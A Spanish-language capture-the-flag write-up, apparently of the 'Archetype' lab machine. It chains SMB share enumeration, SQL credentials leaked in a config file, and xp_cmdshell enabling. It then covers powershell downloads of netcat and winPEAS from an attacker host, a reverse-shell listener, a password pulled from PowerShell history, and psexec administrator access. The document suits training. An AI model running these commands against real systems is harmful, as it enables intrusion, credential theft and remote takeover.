🗹 Verificar si el host está activo:

```shell
ping -c 1 10.129.214.33

PING 10.129.214.33 (10.129.214.33) 56(84) bytes of data.
64 bytes from 10.129.214.33: icmp_seq=1 ttl=127 time=1944 ms

--- 10.129.214.33 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 1943.812/1943.812/1943.812/0.000 ms
```

> Sistema operativo:  **Windows**

🗹 Identificar puertos abiertos y qué servicios están corriendo:

```shell
sudo nmap -p- -sS --open --min-rate 5000 -n -Pn -vvv 10.129.214.33 -oG openPorts

PORT      STATE SERVICE      REASON
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
47001/tcp open  winrm        syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
```

🗹 Ejecutar scripts para recopilar información adicional:

```shell
sudo nmap -p 135,139,445,47001,49664,49665,49666,49667,49668,49669 -sCV 10.129.214.33 -oN targeted
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-12 19:11 -03
Nmap scan report for 10.129.214.33
Host is up (0.17s latency).

PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 2h20m04s, deviation: 4h02m31s, median: 3s
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-03-12T15:12:38-07:00
| smb2-time: 
|   date: 2024-03-12T22:12:35
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
```

| Puerto | Servicio     | Versión                                         |
| ------ | ------------ | ----------------------------------------------- |
| 135    | msrpc        | Microsoft Windows RPC                           |
| 139    | netbios-ssn  | Microsoft Windows netbios-ssn                   |
| 445    | microsoft-ds | Windows Server 2019 Standard 17763 microsoft-ds |
| 47001  | winrm        | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)         |
| 49664  | unknown      | Microsoft Windows RPC                           |
| 49665  | unknown      | Microsoft Windows RPC                           |
| 49666  | unknown      | Microsoft Windows RPC                           |
| 496667 | unknown      | Microsoft Windows RPC                           |
| 49668  | unknown      | Microsoft Windows RPC                           |
| 49669  | unknown      | Microsoft Windows RPC                           |

🗹 Listar recursos compartidos mediante el servicio SMB sin proporcionar usuario ni contraseña:

```shell
smbclient -L //10.129.214.33
Password for [WORKGROUP\n0m3l4c000nt35]:

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	backups         Disk      
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
```

🗹 Acceder al recurso compartido `backups`, descargarlo y abrirlo:

```shell
smbclient //10.129.214.33/backups
Password for [WORKGROUP\n0m3l4c000nt35]:
Try "help" to get a list of possible commands.
smb: \> get prod.dtsConfig 
getting file \prod.dtsConfig of size 609 as prod.dtsConfig (0.9 KiloBytes/sec) (average 0.9 KiloBytes/sec)
smb: \> exit

❯ cat prod.dtsConfig

<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>
```

🗹 Dada la información filtrada accedemos al servidor SQL Server usando el usuario y contraseña encontrados en el archivo de configuración mediante `impacket-mssqlclient`:

```shell
impacket-mssqlclient ARCHETYPE/sql_svc@10.129.214.33 -windows-auth

Impacket v0.12.0.dev1+20240308.164415.4a62f391 - Copyright 2023 Fortra

Password:
[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'.
[*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (140 3232) 
[!] Press help for extra shell commands
SQL (ARCHETYPE\sql_svc  dbo@master)> show databases;
ERROR: Line 1: Could not find stored procedure 'show'.
```

🗹 Enumerar las bases de datos:

```shell
SQL (ARCHETYPE\sql_svc  dbo@master)> enum_db
name     is_trustworthy_on   
------   -----------------   
master                   0   

tempdb                   0   

model                    0   

msdb                     1 
```

[¿Qué es **xp_cmdshell**? ](https://learn.microsoft.com/es-es/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16)  
[Configurar xp_cmdshell](https://learn.microsoft.com/es-es/sql/database-engine/configure-windows/xp-cmdshell-server-configuration-option?view=sql-server-ver16)  

🗹 Habilitar la opción de configuración xp_cmdshell de SQL Server para activar la ejecución de comandos:

```shell
EXEC sp_configure ‘show advanced options’, 1;
RECONFIGURE;
EXEC sp_configure ‘xp_cmdshell’, 1;
RECONFIGURE;
```

🗹 Descargar netcat en la máquina atacante:

[https://github.com/int0x33/nc.exe/blob/master/nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)

🗹 Correr un servidor en el directorio donde se encuentra `nc`:

```shell
python3 -m http.server 8080
```

🗹 Ponerse en escucha con `nc` en la máquina atacante para recibir la reverse shell:

```shell
nc -lnvp 1234
```

🗹 Desde el servidor descargar `netcat` a un directorio en el que el usuario `sql_svc` tenga permisos de escritura usando `powershell`:

```shell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://10.10.15.214/nc64.exe -outfile nc64.exe"
```

🗹 Desde el servidor enviamos una shell a la máquina atacante que está en escucha con `netcat`:

```shell
SQL (ARCHETYPE\sql_svc  dbo@master)> xp_cmdshell "powershell -c "
```
## User flag

La user flag se encuentra en el directorio `C:\Users\sql_svc\Desktop\user.txt`.

🗹 Descargar `winPEASx64` en la máquina atacante:

[winPEASx64.exe](https://github.com/carlospolop/PEASS-ng/releases/tag/20240310-532aceca)

🗹 Desde el servidor, con `powershell` descargar `winPEASx64` mediante el servidor que está corriendo en la máquina atacante:

```shell
C:\Users\sql_svc\Downloads>powershell
powershell
Windows PowerShell 
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\sql_svc\Downloads> wget http://10.10.15.214/winPEASx64.exe -outfile winPEASx64.exe
wget http://10.10.15.214/winPEASx64.exe -outfile winPEASx64.exe
```

🗹 Ejecutar `winPEASx64.exe`:

```shell
<SNIP>
͹ PowerShell Settings
    PowerShell v2 Version: 2.0
    PowerShell v5 Version: 5.1.17763.1
    PowerShell Core Version: 
    Transcription Settings: 
    Module Logging Settings: 
    Scriptblock Logging Settings: 
    PS history file: C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
    PS history size: 79B
```

🗹 Leer el archivo del historial de la consola:

```
PS C:\Users\sql_svc\Downloads> more C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
more C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

🗹 Conectarse al servidor mediante `impacket-psexec` usando la contraseña encontrada:

```shell
impacket-psexec administrator@10.129.120.129

Impacket v0.12.0.dev1+20240308.164415.4a62f391 - Copyright 2023 Fortra

Password:
[*] Requesting shares on 10.129.120.129.....
[*] Found writable share ADMIN$
[*] Uploading file fmcXjNTR.exe
[*] Opening SVCManager on 10.129.120.129.....
[*] Creating service vIZG on 10.129.120.129.....
[*] Starting service vIZG.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2061]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> 
```
## Root flag

La root flag se encuentra en el directorio `C:\Users\Administrator\Desktop\`.